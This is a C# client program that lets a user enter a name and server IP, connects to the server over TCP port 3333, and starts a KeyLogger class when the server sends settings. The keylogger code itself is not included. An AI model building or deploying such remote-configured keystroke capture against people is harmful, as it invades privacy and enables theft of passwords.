using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class Program
    {
        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbs;
        private setSetting set;
        private ClientForm clientForm;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Program p = new Program();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            
            //p.clientForm.ShowDialog();
            
            p.connectToServer();
            Application.Run();
        }
        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {

                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }
                string data = Encoding.ASCII.GetString(buffer);
                var dataFromServer = data.Split(new[] { '\r' }, 2);
               
                if (dataFromServer[0] == "id") {
                    id = dataFromServer[1];
                   
                }
                    
                if (dataFromServer[0] == "setting") { 
                    String setting = dataFromServer[1];
                    playMonitor(setting); //This method obtains the settings string from the server

                }
                System.Threading.Thread.Sleep(7000);
                SendData("server send: " + data);
                // Start receiving data again.
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
            }
            // Avoid Pokemon exception handling in cases like these.
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        // set setting and here will play all triggers;
        private void playMonitor(string setting)
        {
            //set setting 
            set = new setSetting(setting);

            // play key logger
            KeyLogger k = new KeyLogger(dbs, set);
            
            //here will play all triggers;
        }

        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndConnect(AR);                
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
                
                if(id != null)
                    SendData("id\r" +id);
                else SendData("name\r" + name);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
                
                reConnect();
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        public void connectToServer()
        {
            try
            {
                clientForm = new ClientForm();
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;

                dbs = new DBclient(name);

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, null);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message);
            }


        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public void SendData(String data) {
            try {
                ShowErrorDialog("try send: \r\n"+data);
                var sendData = Encoding.ASCII.GetBytes(data);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);

            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                reConnect();
                SendData("send again " + data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public void reConnect() {
            // Create new socket 
            clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            buffer = new byte[clientSocket.ReceiveBufferSize];

            // Connect To Server 
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
            // The function ConnectCallback set callback to receive and send 
            clientSocket.BeginConnect(endPoint, ConnectCallback, null);
        }
    }
}
